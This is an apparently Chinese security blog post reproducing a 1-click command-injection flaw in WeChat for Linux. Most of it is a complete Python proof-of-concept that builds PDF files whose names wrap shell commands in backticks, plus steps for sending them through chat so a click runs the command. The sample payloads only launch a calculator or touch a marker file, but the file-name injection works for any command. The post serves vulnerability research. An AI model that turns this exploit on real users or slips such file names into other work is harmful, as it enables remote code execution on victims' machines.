#  Wechat RCE 复现  
原创 泼猴
                    泼猴  表哥带我   2026-02-11 00:30  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/pxKqYxJWy7MwqgqlfAHibBF3z5SG1jQ33gAZpcpSzNrDOcWqOwsflg9dtktFJDmQDp8S0zibEmjILNJGcxK9bAjA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=0 "")  
> ❝  
> 由于传播、利用本公众号"表哥带我"所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，本文仅供安全研究。  
  
  
<table><tbody><tr style="box-sizing: border-box;visibility: visible;"><td colspan="4" data-colwidth="100.0000%" width="100.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;background-color: rgb(100, 130, 228);box-sizing: border-box;padding: 0px;visibility: visible;"><section style="text-align: center;color: rgb(255, 255, 255);box-sizing: border-box;visibility: visible;"><p style="margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">漏洞概述</span></strong></p></section></td></tr><tr style="box-sizing: border-box;visibility: visible;"><td data-colwidth="24.0000%" width="24.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;color: rgb(0, 0, 0);padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">漏洞名称</span></strong></p></section></td><td colspan="3" data-colwidth="76.0000%" width="76.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">微信 Linux 版 1-Click 命令注入漏洞</span></p></section></td></tr><tr style="box-sizing: border-box;visibility: visible;"><td data-colwidth="24.0000%" width="24.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;color: rgb(0, 0, 0);padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">公开时间</span></strong></p></section></td><td data-colwidth="28.0000%" width="28.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><span style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">2026-02-10</span></span></p></section></td><td data-colwidth="28.0000%" width="28.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span style="color: rgb(0, 0, 0);box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">POC状态</span></span></strong></p></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;color: rgb(100, 130, 228);box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">已公开</span></strong></p></section></td></tr><tr style="box-sizing: border-box;visibility: visible;"><td data-colwidth="24.0000%" width="24.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;color: rgb(0, 0, 0);padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">漏洞类型</span></strong></p></section></td><td data-colwidth="28.0000%" width="28.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">命令注入</span></p></section></td><td data-colwidth="28.0000%" width="28.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;color: rgb(0, 0, 0);padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">EXP状态</span></strong></p></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;color: rgb(100, 130, 228);box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">已公开</span></strong></p></section></td></tr><tr style="box-sizing: border-box;visibility: visible;"><td data-colwidth="24.0000%" width="24.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span style="color: rgb(0, 0, 0);box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">利用可能性</span></span></strong></p></section></td><td data-colwidth="28.0000%" width="28.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">高</span></p></section></td><td data-colwidth="28.0000%" width="28.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;color: rgb(0, 0, 0);box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">技术细节状态</span></strong></p></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-width: 1px;border-color: rgb(100, 130, 228);border-style: solid;box-sizing: border-box;padding: 0px;visibility: visible;"><section style="font-size: 12px;padding: 0px 8px;color: rgb(100, 130, 228);box-sizing: border-box;visibility: visible;"><p style="white-space: normal;margin: 0px 8px;padding: 0px;box-sizing: border-box;visibility: visible;"><strong style="box-sizing: border-box;visibility: visible;"><span leaf="" style="visibility: visible;">已公开</span></strong></p></section></td></tr></tbody></table>  
  
**核心原理**  
：微信Linux版在处理文件名时未做安全校验或转义，当文件名中包含反引号包裹的命令时，会直接触发shell命令执行。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6OwqFjJBib4LX7WZ91LicYyR6tTMUolglMSYqiax9ewVgGTGhI8EicNhn6HTibobFlGcQkjZNOMkJa8QlNSWuBXUSWY9rISBz6QrzJKE/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/UA4ABKCY6OxaTEn55M9DDgIqgh9uA1phOeV7XHazLtibuuQfXNUfz1eTWLmtja1jguGj1AoMa3QuI34CzRJgwTuFUXRjEp3picT2nqDbA2bMU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6OztoDcSwo654gclQthR8vqtOibYG3Hrsglgv2UAWlVsu3Eia0R1aTKNPzSk8uDicEWH48w4AmMphS5JaPPibZO4U1680FJObC03qiaY/640?wx_fmt=png&from=appmsg "")  
  
  
全自动复现脚本：  
```
#!/usr/bin/env python3
"""
WeChat Linux RCE PoC
表哥带我-泼猴
测试版本: WeChat v4.1 for Linux
"""

import os
import sys
import time
import subprocess
import tempfile
import shutil

class WeChatPDFRCE:
    def __init__(self):
        self.poc_dir = tempfile.mkdtemp(prefix="wechat_poc_")
        self.test_commands = {
            "kcalc": "KDE Calculator",
            "gnome-calculator": "GNOME Calculator", 
            "xcalc": "X11 Calculator",
            "zenity --info --text='RCE_SUCCESS'": "Zenity Popup (Test)"
        }

    def check_dependencies(self):
        """检查系统依赖"""
        print("[*] 检查系统环境...")

        # 检查可用计算器
        available_calc = None
        for cmd in ["kcalc", "gnome-calculator", "xcalc"]:
            if shutil.which(cmd):
                available_calc = cmd
                print(f"[+] 发现可用计算器: {cmd}")
                break

        if not available_calc:
            print("[-] 未找到计算器，尝试安装: sudo apt install kcalc")
            sys.exit(1)

        return available_calc

    def generate_pdf_structure(self):
        """生成最小有效PDF结构"""
        # 基础PDF对象结构
        objects = []

        # Object 1: Catalog
        objects.append(b"1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n")

        # Object 2: Pages
        objects.append(b"2 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>\nendobj\n")

        # Object 3: Page
        objects.append(b"3 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n>>\nendobj\n")

        # Object 4: Content (空白页)
        content = b"4 0 obj\n<<\n/Length 44\n>>\nstream\nBT\n/F1 12 Tf\n100 700 Td\n(Test PDF) Tj\nET\nendstream\nendobj\n"
        objects.append(content)

        # 构建xref和trailer
        xref_offset = 9  # %PDF-1.4\n 长度
        xref_entries = ["0000000000 65535 f "]

        for obj in objects:
            xref_entries.append(f"{xref_offset:010d} 00000 n ")
            xref_offset += len(obj)

        # 组装PDF
        pdf = b"%PDF-1.4\n"
        for obj in objects:
            pdf += obj

        xref_start = len(pdf)
        pdf += b"xref\n"
        pdf += f"0 {len(xref_entries)}\n".encode()
        for entry in xref_entries:
            pdf += entry.encode() + b"\n"

        pdf += b"trailer\n<<\n/Size " + str(len(xref_entries)).encode() + b"\n/Root 1 0 R\n>>\nstartxref\n"
        pdf += str(xref_start).encode() + b"\n%%EOF\n"

        return pdf

    def create_poc_file(self, command):
        """创建单个PoC文件"""
        safe_name = command.replace(" ", "_").replace("--", "")
        filename = f"`{command}`.pdf"
        filepath = os.path.join(self.poc_dir, filename)

        pdf_data = self.generate_pdf_structure()

        with open(filepath, 'wb') as f:
            f.write(pdf_data)

        return filepath, filename

    def generate_all_pocs(self):
        """生成所有测试PoC"""
        print(f"\n[*] 在 {self.poc_dir} 生成PoC文件...")

        calc_cmd = self.check_dependencies()

        # 生成主PoC（计算器）
        path, name = self.create_poc_file(calc_cmd)
        print(f"[+] 主PoC已生成: {name}")
        print(f"    路径: {path}")
        print(f"    命令: {calc_cmd}")

        # 生成验证PoC（创建标记文件）
        marker_path, marker_name = self.create_poc_file("touch /tmp/wechat_rce_confirmed")
        print(f"[+] 验证PoC已生成: {marker_name}")

        return self.poc_dir

    def show_usage(self):
        """显示使用说明"""
        print("\n" + "="*60)
        print("复现步骤:")
        print("="*60)
        print("1. 打开微信Linux版（确保版本为v4.1或受影响版本）")
        print("2. 进入文件传输助手或任意聊天窗口")
        print("3. 发送生成的PDF文件（拖拽到聊天窗口）")
        print("4. 在聊天界面中点击该PDF文件消息")
        print("5. 观察是否弹出计算器或创建标记文件")
        print("="*60)
        print(f"PoC文件位置: {self.poc_dir}")
        print("文件列表:")
        for f in os.listdir(self.poc_dir):
            print(f"  - {f}")
        print("="*60)

    def verify_execution(self):
        """验证命令是否执行"""
        marker = "/tmp/wechat_rce_confirmed"
        if os.path.exists(marker):
            print(f"[+] 验证成功！标记文件存在: {marker}")
            os.remove(marker)
            return True
        return False

    def cleanup(self):
        """清理临时文件"""
        if os.path.exists(self.poc_dir):
            shutil.rmtree(self.poc_dir)
            print(f"[*] 已清理临时目录: {self.poc_dir}")

if __name__ == "__main__":
    poc = WeChatPDFRCE()

    try:
        poc.generate_all_pocs()
        poc.show_usage()

        print("\n[*] 等待用户测试（按Ctrl+C结束）...")
        print("[*] 测试完成后检查标记文件...")

        while True:
            time.sleep(2)
            if poc.verify_execution():
                print("[!] 漏洞复现成功！")
                break

    except KeyboardInterrupt:
        print("\n[*] 用户中断测试")
    finally:
        poc.cleanup()
```  
  
  
  
其他阅读：  
  
[【网安音乐首发】泼猴之歌](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247487036&idx=1&sn=cff35a8bf0ae85cd929738c8f2ad927a&scene=21#wechat_redirect)  
  
  
[测绘引擎的真正用途是找小电影](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247487024&idx=1&sn=614f6c835174bba18975eef2d48ceaa5&scene=21#wechat_redirect)  
  
  
[绕过千问限制使用红包下单](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486980&idx=1&sn=cb43bdcddd4eecbaeea230d3f51d75e8&scene=21#wechat_redirect)  
  
  
[丹麦情报机构重启"黑客学院"公开招募黑客](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486947&idx=1&sn=221b7f2c2648a9ac9c6d44b382d03daf&scene=21#wechat_redirect)  
  
  
[网传BT面板突遭黑产批量攻击](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486920&idx=1&sn=4d07ffb5748ba4f62ef6cf9ccfb0758e&scene=21#wechat_redirect)  
  
  
[【吃瓜】下头X为了千问助力脸都不要了](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486875&idx=1&sn=16ee18913d27f0aea8e8915b345b0d8c&scene=21#wechat_redirect)  
  
  
[用泄露的爱泼斯坦邮箱拿下微软365个人版](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486848&idx=1&sn=ea2645950f190e264ecc7092d5381690&scene=21#wechat_redirect)  
  
  
[网传海角社区泄露1570万条用户数据](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486775&idx=2&sn=0460974909d1d3c15de929de44d69bc8&scene=21#wechat_redirect)  
  
  
[【吃瓜】Telegram大量用户数据泄露](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486552&idx=1&sn=6e3fe989d90dcefc461261763bb1f100&scene=21#wechat_redirect)  
  
  
[Notepad++遇国家级APT投毒定向百万设备](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486743&idx=1&sn=c9b0e8ed68b2a53e723f3e4453b2c9e4&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/UA4ABKCY6Ox05KjuCUgUsYNC3baa8Ny4hib88STQicMhgMNfjAiaO9clVFTmwh0gZ2hsmicjWYkh3nJT81WiaP4pe6UQkWh6IWDvsXWicEmibR4jU0/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=9 "")  
  
  
**左侧长按加入**  
  
**吃瓜交流群**  
  
动态入群二维码  
  
